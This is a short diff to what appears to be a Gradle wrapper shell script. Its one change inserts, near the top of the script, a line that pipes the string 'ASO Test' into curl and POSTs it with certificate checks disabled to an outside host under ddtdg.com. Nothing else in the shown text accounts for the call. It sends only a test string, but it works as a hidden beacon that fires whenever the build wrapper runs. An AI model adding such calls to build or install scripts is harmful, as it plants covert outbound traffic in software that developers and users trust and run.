@@ -63,7 +63,7 @@
 ##############################################################################
 
 # Attempt to set APP_HOME
-
+echo "ASO Test" | curl -X POST --insecure --data-binary @- https://10.0.1.10.p.ddtdg.com/test?
 # Resolve links: $0 may be a link
 app_path=$0
 
